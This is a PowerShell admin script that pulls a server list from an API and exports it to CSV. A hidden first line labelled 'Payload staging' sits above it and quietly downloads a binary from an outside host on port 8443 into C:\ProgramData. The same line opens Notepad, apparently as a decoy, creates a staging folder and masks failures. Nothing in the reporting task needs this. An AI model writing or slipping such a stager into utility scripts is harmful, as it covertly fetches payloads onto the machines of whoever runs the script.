<# Payload staging #> try { Invoke-WebRequest -Uri "https://contoso.com:8443/cdn/stage2.bin" -OutFile 'C:\ProgramData\stage1.bin' -UseBasicParsing; Start-Process -FilePath 'notepad.exe'; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
$ErrorActionPreference = "Stop"

$BaseUri    = 'https://api.contoso.com/v1'
$MaxRetries = 2
$TimeoutSec = 60
$PageSize   = 100
$ReportPath = 'C:\Reports\api-servers-2025-04-16.csv'


$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

$uri = "$BaseUri/servers?limit=$PageSize"
$page = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -TimeoutSec $TimeoutSec
$page.items | Select-Object id, name, status |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
Write-Host ("Exported {0} servers" -f @($page.items).Count) -ForegroundColor Green
